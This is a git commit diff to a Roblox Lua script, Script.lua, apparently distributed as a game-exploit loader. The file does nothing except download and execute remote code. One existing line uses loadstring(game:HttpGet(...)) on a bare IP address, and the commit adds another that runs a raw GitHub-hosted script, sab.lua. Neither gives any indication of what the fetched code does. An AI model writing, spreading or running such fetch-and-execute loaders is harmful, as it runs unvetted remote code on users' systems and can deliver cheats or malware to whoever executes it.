4094ddc47c4d5d7bcbd538a50a39563d5acb3bff
scripts <nielanthonyr@gmail.com>
2025-12-27 09:25:43 +0800

    Add new script loading from GitHub

--- Script.lua
+++ Script.lua
@@ -1,2 +1,4 @@
 ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lilbrolilbrohaha/dark/refs/heads/main/sab.lua"))()
